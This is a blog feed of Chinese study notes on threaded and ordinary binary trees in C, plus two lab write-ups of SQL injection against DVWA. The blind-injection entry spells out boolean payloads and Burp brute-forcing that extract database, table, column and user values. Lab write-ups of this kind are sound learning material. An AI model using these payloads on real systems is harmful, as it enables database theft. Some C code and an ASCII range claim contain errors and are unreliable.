<h3 id="中序线索化"><a href="#中序线索化" class="headerlink" title="中序线索化"></a>中序线索化</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//全局变量pre，指向当前访问结点的前驱</span></span><br><span class="line">ThreadNode *pre=null;</span><br><span class="line"><span class="comment">//中序线索化二叉树T</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">CreateInThread</span><span class="params">(ThreadTree T)</span>&#123;</span><br><span class="line">    pre=null;</span><br><span class="line">    <span class="keyword">if</span>(T!=null)&#123;</span><br><span class="line">        InThread(T);</span><br><span class="line">        <span class="keyword">if</span>(pre-&gt;rchild==null)</span><br><span class="line">            pre-&gt;rtag=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//线索二叉树的结点</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ThreadNode</span>&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ThreadNode</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span></span><br><span class="line">    <span class="type">int</span> ltag,rtag;</span><br><span class="line">&#125;ThreadNode,* ThreadTree;</span><br><span class="line"><span class="comment">//中序遍历二叉树，一边遍历一边线索化</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InThread</span><span class="params">(ThreadTree T)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T!=null)&#123;</span><br><span class="line">        InOrder(T-&gt;lchild);</span><br><span class="line">        visit(T);</span><br><span class="line">        InOrder(T-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">visit</span><span class="params">(ThreadNode *q)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(q-&gt;lchild==null)&#123;</span><br><span class="line">        q-&gt;lchild=pre;</span><br><span class="line">        q-&gt;ltag=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(pre!=null&amp;&amp;pre-&gt;rchild==null)&#123;</span><br><span class="line">        pre-&gt;rchild=q;</span><br><span class="line">        pre-&gt;rtag=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    pre=q;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="先序线索化"><a href="#先序线索化" class="headerlink" title="先序线索化"></a>先序线索化</h3><p><img src="/2022/08/18/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709204642583.png" alt></p>
<h2 id="在线索二叉树中找前驱后继"><a href="#在线索二叉树中找前驱后继" class="headerlink" title="在线索二叉树中找前驱后继"></a>在线索二叉树中找前驱后继</h2><h3 id="中序后继"><a href="#中序后继" class="headerlink" title="中序后继"></a>中序后继</h3><p><img src="/2022/08/18/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709205639652.png" alt><br>该方法的时间复杂度是O（1)</p>
<h3 id="中序前驱"><a href="#中序前驱" class="headerlink" title="中序前驱"></a>中序前驱</h3><p><img src="/2022/08/18/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709205928279.png" alt></p>
<h3 id="先序前驱"><a href="#先序前驱" class="headerlink" title="先序前驱"></a>先序前驱</h3><p>二叉链表没办法找到先序前驱<br>将二叉链表转化为三叉链表<br><img src="/2022/08/18/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709210518474.png" alt></p>
<h3 id="后序前驱"><a href="#后序前驱" class="headerlink" title="后序前驱"></a>后序前驱</h3><p><img src="/2022/08/18/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709211254569.png" alt></p>
<h3 id="后序后继"><a href="#后序后继" class="headerlink" title="后序后继"></a>后序后继</h3><p>p.rtag==0，则一定有右孩子，所以只能用土办法来找</p>
<p><img src="/2022/08/18/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709210913690.png" alt></p>
<p>p为根节点则没有后序后继</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="/2022/08/18/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709211007944.png" alt></p>
]]></content>
      <tags>
        <tag>数据结构</tag>
        <tag>树与二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL盲注</title>
    <url>/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>对sql注入类型的判断以及对于盲注的两种方法二分法和爆破法的实现</p>
<span id="more"></span>
<h3 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h3><p>(1)首先判断时字符型还是数字型注入<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818151435068.png" alt><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818151552860.png" alt></p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">分析：</span><br><span class="line">依次输入</span><br><span class="line"><span class="number">1</span>                    回显：exists</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span>            回显：exists</span><br><span class="line"><span class="keyword">and</span>逻辑语句的会先结果都是存在的，没有起到应有的效果，说明不是整型注入，猜测是字符型注入</span><br></pre></td></tr></table></figure>
<p>(2)猜解字符型<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818151701973.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818151816959.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818151840594.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818151903942.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818151924099.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818160837212.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818160855152.png" alt></p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line">分析：</span><br><span class="line">通过上面<span class="number">5</span>个图找到了引号插入点后，依次输入</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">2</span>                 回显：missing</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">2</span>                  回显：<span class="keyword">exists</span></span><br><span class="line">and和or语句起到了效果，说明是字符型注入</span><br><span class="line">并且经过<span class="meta">#和--的测试，注释符也没有被过滤</span></span><br></pre></td></tr></table></figure>
<h3 id="获取数据库"><a href="#获取数据库" class="headerlink" title="获取数据库"></a>获取数据库</h3><p>(1)数据库名长<br>语法：1’ and length(database())=X#<img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818152204573.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818152252961.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818152306683.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818152346187.png" alt><br>可以知道数据库名长为4位，然后就是最麻烦的地方猜名字，两种方法ascll二分法和burp爆破</p>
<h4 id="二分法"><a href="#二分法" class="headerlink" title="二分法"></a>二分法</h4><p>数字的ascll是从80-89，小写字母是从97-122，大写字母是从65-90</p>
<p><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818154128881.png" alt><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818154100025.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818154232882.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818154251514.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818154320008.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818154350179.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818154414112.png" alt><br>参照ascll，100是d，因为在前面手工注入的时候已经知道名字是dvwa，后面只做验证不做二分法<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818154550635.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818154702041.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818154729876.png" alt><br>可以看到得到的ascll码为100，118，119，97，转义过来就是d,v,w,a</p>
<h4 id="爆破法"><a href="#爆破法" class="headerlink" title="爆破法"></a>爆破法</h4><p>第一步：抓包送去爆破<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818171940461.png" alt><br>第二步：更改攻击方式为：集束炸弹（cluster bomb)<br>将抓包中的判断语句&gt;97改为=97，在burp中是16进制表示&gt;的16进制是%3E,=的十六进制是%3D(很重要)，选定爆破范围：第一个轰炸点是sbustr(string,int a,int b)函数的int a位置，第二个位置是所猜测的ascll码位置<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818172343357.png" alt><br>第三步：设置攻击方式<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818172408780.png" style="zoom: 67%;"><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818172421304-16609544205811.png" style="zoom: 50%;"><br>如图所示，由上面的步骤知道数据库名共四个字符所以爆破点1的三个参数是1，4，1，爆破点2则是从ascll的0到127遍历，轰炸一边大概要半个小时左右这还是四个字节，所以这也体现出来了工具的重要性，推荐sqlmap，实例看sqlmap使用。配置好了就可以开始爆破了。<br>第四步：得到结果<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818172743154.png" alt><br>跑了半个小时终于跑出来了，选择length就可以很快找到，可以看到对应的四个字符的ascll分别是100,108,118,119,这与二分法得到的结果是一样的，后面需要猜名字的都可以像这样，但是生命苦短，我选sqlmap一把梭。</p>
<h3 id="判断表的数量"><a href="#判断表的数量" class="headerlink" title="判断表的数量"></a>判断表的数量</h3><p>语法：1’and (select count(*) from information_schema.tables where table_schema=’dvwa’ limit 0,1)=’X （此处不需要limit函数）<br>X为表的数量<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818161240201.png" alt><br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818161312586.png" alt><br>说明数据库中有两个表</p>
<h3 id="判断表长"><a href="#判断表长" class="headerlink" title="判断表长"></a>判断表长</h3><p>语法：1’and length(substr((select table_name from information_schema.tables where table_schema=’dvwa’ limit a,b),1))&gt;’X<br>a 为从第几行  b 为输出几行数据  limit函数详情见函数库 X为表名长<br>所以第一张表名长<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818164718463.png" alt><br>第二张表名长<img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818164812015.png" alt></p>
<h3 id="判断表名"><a href="#判断表名" class="headerlink" title="判断表名"></a>判断表名</h3><p>语法：1’and ascii(substr((select table_name from information_schema.tables where table_schema=’dvwa’ limit 0,1),A,1))&gt;’X              A表示第A位，X表示第A位对应的ascll码</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">依次输入</span><br><span class="line">1&#x27;and ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;dvwa&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="string">&#x27;97</span></span><br><span class="line"><span class="string">1&#x27;</span><span class="keyword">and</span> ascii(<span class="built_in">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;dvwa&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&lt;<span class="string">&#x27;122</span></span><br><span class="line"><span class="string">1&#x27;</span><span class="keyword">and</span> ascii(<span class="built_in">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;dvwa&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&lt;<span class="string">&#x27;109</span></span><br><span class="line"><span class="string">1&#x27;</span><span class="keyword">and</span> ascii(<span class="built_in">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;dvwa&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&lt;<span class="string">&#x27;103</span></span><br><span class="line"><span class="string">1&#x27;</span><span class="keyword">and</span> ascii(<span class="built_in">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;dvwa&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&lt;<span class="string">&#x27;105</span></span><br><span class="line"><span class="string">1&#x27;</span><span class="keyword">and</span> ascii(<span class="built_in">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;dvwa&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="string">&#x27;103</span></span><br><span class="line"><span class="string">//利用ascii()和substr()以及limit得出：第一个表的第一个字符为g</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//综上所述，</span></span><br><span class="line"><span class="string">第一个表名为：guestbook</span></span><br><span class="line"><span class="string">第二个表名为：users</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
<p>或者使用爆破</p>
<h3 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h3><p>语法：1’and (select count(*) from information_schema.columns where table_name=’users’)=’11<img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818165921936.png" alt><br>如图所示，dvwa的users表的字段数为：11</p>
<h3 id="判断字段名长"><a href="#判断字段名长" class="headerlink" title="判断字段名长"></a>判断字段名长</h3><p>1’and length(substr((select column_name from information_schema.columns where table_name=’users’ limit 0,1),1))=’7<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818170155864.png" alt><br>如图所示，条件为表名是users的从information_schema.columns表中查字段名的第一行的数据从第一位开始输出的长度是7，然后就是二分法或者爆破</p>
<h3 id="判断字段名"><a href="#判断字段名" class="headerlink" title="判断字段名"></a>判断字段名</h3><p>语法：1’and ascii(substr((select column_name from information_schema.columns where table_name=’users’ limit 0,1),1,1))=’117<img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818170438584.png" alt><br>如图所示，条件为表名是users的从information_schema.columns表中查字段名的第一行的数据的第一位的ascll是117也就是u，最后得到结果为user_id</p>
<h3 id="判断字段的字段值"><a href="#判断字段的字段值" class="headerlink" title="判断字段的字段值"></a>判断字段的字段值</h3><p>查询users字段的数据<br>语法：1’and (select count(*) from users)=’X         X为该字段内共X条数据<img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818170831417.png" alt><br>如图所示，users表中共5条数据</p>
<p>语法：1’and length(substr((select user from users limit 0,1),1))=’X        X为第一个字段值长度，第二、三个字段值更换limit函数参数<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818171129966.png" alt><br>如图所示，users字段值中第一个字段值长度为5</p>
<p>语法：1’and ascii(substr((select user from users limit 0,1),1,1))=’X             X为第一个字段值第一个字符的ascll码<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818171222053.png" alt></p>
<p>注：password表中得到的是md5加密后的结果需要自行解密</p>
]]></content>
      <categories>
        <category>web攻防</category>
      </categories>
      <tags>
        <tag>网络攻防</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>二叉树</title>
    <url>/2022/08/17/%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>二叉树的存储结构和链式存储的代码实现、遍历的代码实现和层序遍历构造二叉树的代码实现</p>
<span id="more"></span>
<h2 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h2><p>二叉树是有序树（左右子树不能颠倒）递归定义的数据结构</p>
<p><img src="/2022/08/17/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220701141656221.png" alt><br><img src="/2022/08/17/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220701142020842.png" alt><br><img src="/2022/08/17/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220701142503488.png" alt><br><img src="/2022/08/17/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709114958544.png" alt></p>
<h3 id="二叉树的存储结构"><a href="#二叉树的存储结构" class="headerlink" title="二叉树的存储结构"></a>二叉树的存储结构</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 100</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>&#123;</span></span><br><span class="line">    ElemType value;<span class="comment">//结点中的数据元素</span></span><br><span class="line">    <span class="type">bool</span> isEmpty;<span class="comment">//结点是否为空</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">TreeNode t[MaxSize];<span class="comment">//定义一个长度为MaxSize的数组t，按照从上至下从左至右的顺序依次存储完全二叉树的各个结点</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;MaxSize;i++)&#123;</span><br><span class="line">    t[i].isEmpty=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/17/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709120058958.png" alt><br><img src="/2022/08/17/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709120134485.png" alt><br><img src="/2022/08/17/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709120216992.png" alt></p>
<h3 id="二叉树的链式存储"><a href="#二叉树的链式存储" class="headerlink" title="二叉树的链式存储"></a>二叉树的链式存储</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span>&#123;</span></span><br><span class="line">	ElemType data;                     <span class="comment">//数据域</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span>    <span class="comment">//左右孩子指针</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span> *<span class="title">parent</span>;</span>            <span class="comment">//父节点指针（三叉链表——方便找父节点）</span></span><br><span class="line">&#125;BiTNode,*BiTree;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/17/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709121942852.png" alt></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义一颗空树</span></span><br><span class="line">BiTree root =null;</span><br><span class="line"></span><br><span class="line"><span class="comment">//插入根节点</span></span><br><span class="line">root = (BiTree)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BiTNode));</span><br><span class="line">root-&gt;data = &#123;<span class="number">1</span>&#125;;</span><br><span class="line">root-&gt;lchild = null;</span><br><span class="line">root-&gt;rchild = null;</span><br><span class="line"></span><br><span class="line"><span class="comment">//插入新结点</span></span><br><span class="line">BiTNode * p =(BiTNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BiTNode));</span><br><span class="line">p-&gt;data = &#123;<span class="number">2</span>&#125;;</span><br><span class="line">p-&gt;lchild = <span class="literal">NULL</span>;</span><br><span class="line">p-&gt;rchild = null;</span><br><span class="line">root-&gt;lchild = p;  <span class="comment">//作为根结点的左孩子</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/17/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709125146274.png" alt></p>
<h2 id="二叉树的遍历"><a href="#二叉树的遍历" class="headerlink" title="二叉树的遍历"></a>二叉树的遍历</h2><p><img src="/2022/08/17/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709130230793.png" alt></p>
<p><img src="/2022/08/17/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709130623105.png" alt></p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//先序遍历</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">PreOrder</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T!=null)&#123;</span><br><span class="line">        visit(T);            <span class="comment">//访问根节点</span></span><br><span class="line">        PreOrder(T-&gt;lchild); <span class="comment">//递归遍历左子树</span></span><br><span class="line">        PreOrder(T-&gt;rchild); <span class="comment">//递归遍历右子树0</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//时间复杂度为O(h)</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/17/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709192542556.png" alt><br>先序遍历——第一次路过时访问结点<br>中序遍历——第二次路过时访问结点<br>后序遍历——第三次路过时访问结点<br><img src="/2022/08/17/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709192656825.png" alt></p>
<h3 id="求树的深度"><a href="#求树的深度" class="headerlink" title="求树的深度"></a>求树的深度</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">treeDepth</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line">    IF(T==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="type">int</span> l = treeDepth(T-&gt;lchild);</span><br><span class="line">        <span class="type">int</span> r = treeDepth(T-&gt;rchild);</span><br><span class="line">        <span class="keyword">return</span> l&gt;r? l+<span class="number">1</span>:r+<span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="二叉树的层序遍历"><a href="#二叉树的层序遍历" class="headerlink" title="二叉树的层序遍历"></a>二叉树的层序遍历</h2><p><img src="/2022/08/17/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709193412735.png" alt></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//二叉树的结点（链式存储）</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span></span><br><span class="line">&#125;BiTNode,*BiTree;</span><br><span class="line"></span><br><span class="line"><span class="comment">//链式队列结点</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span>&#123;</span></span><br><span class="line">    BiTNode * data;           <span class="comment">//存指针而不是结点来节省空间</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LinkNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    LinkNode *front,*rear;<span class="comment">//队头队尾指针</span></span><br><span class="line">&#125;LinkQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">//层序遍历</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">LevelOrder</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line">    LinkQueue Q;</span><br><span class="line">    InitQueue(Q);  <span class="comment">//初始化</span></span><br><span class="line">    BiTree p;</span><br><span class="line">    EnQueue(Q,T);    <span class="comment">//将根节点入队</span></span><br><span class="line">    <span class="keyword">while</span>(!IsEmpty(Q))&#123;</span><br><span class="line">        DeQueue(Q,p);   <span class="comment">//队头结点出队</span></span><br><span class="line">        visit(p);       <span class="comment">//访问出队结点</span></span><br><span class="line">        <span class="keyword">if</span>(p-&gt;lchild!=null)</span><br><span class="line">            EnQueue(Q,p-&gt;lchild);</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;rchild!=null)</span><br><span class="line">            EnQueue(Q.p-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="由遍历序列构造二叉树"><a href="#由遍历序列构造二叉树" class="headerlink" title="由遍历序列构造二叉树"></a>由遍历序列构造二叉树</h2><p>给定一个前中后序遍历序列可能对应多种二叉树<br>给定中序加一种其他序（前序后序层序）对应唯一二叉树</p>
]]></content>
      <tags>
        <tag>数据结构</tag>
        <tag>树与二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入</title>
    <url>/2022/08/17/sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>SQL是操作数据库数据的结构化查询语言，网页的应用数据和后台数据库中的数据进行交互时会采用SQL。而SQL注入是将Web页面的原URL、表单域或数据包输入的参数，修改拼接成SQL语句，传递给Web服务器，进而传给数据库服务器以执行数据库命令。如Web应用程序的开发人员对用户所输入的数据或cookie等内容不进行过滤或验证(即存在注入点)就直接传输给数据库，就可能导致拼接的SQL被执行，获取对数据库的信息以及提权，发生SQL注入攻击。<br><span id="more"></span></p>
<h2 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h2><p>首先先看看输出<br><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817105442755.png" alt><br><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817105456531.png" alt><br><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817105510464.png" alt><br>通过代码可以看到表单输入id没有任何过滤<img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817105528953.png" alt></p>
<h3 id="注入点判断"><a href="#注入点判断" class="headerlink" title="注入点判断"></a>注入点判断</h3><p><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817110157425.png" alt><br>受引号闭合影响<br><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817110321644.png" alt><br>或者在url栏输入<br><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817110448845.png" alt><br><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817110527094.png" alt><br>是等价的</p>
<h3 id="判断字段"><a href="#判断字段" class="headerlink" title="判断字段"></a>判断字段</h3><p><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817110631637.png" alt><br>order by 3时报错<br><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817110650685.png" alt><br>2是正确的3返回错误，即有两个字段<br><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817110944135.png" alt></p>
<h3 id="查询数据库名"><a href="#查询数据库名" class="headerlink" title="查询数据库名"></a>查询数据库名</h3><p><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817111143792.png" alt></p>
<h3 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h3><p>因为information_schema的排序规则是utf8_general_ci,而dvwa中排序规则是utf8_unicode_ci,需要逐一更改每个字段；或者直接使用16进制读取然后解码</p>
<p><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817112730977.png" alt><br>用burp自带的解码器用ASCLL hex解码<br><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817113057326.png" alt><br><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817113146151.png" alt><br>得到表名是guestbook和users<br>也可以通过group_concat将表名拼接起来<br><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817143345283.png" alt></p>
<h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>mysql5.0及以上版本中自带数据库information_schema,用来存储所有数据库名、表名、列名。</p>
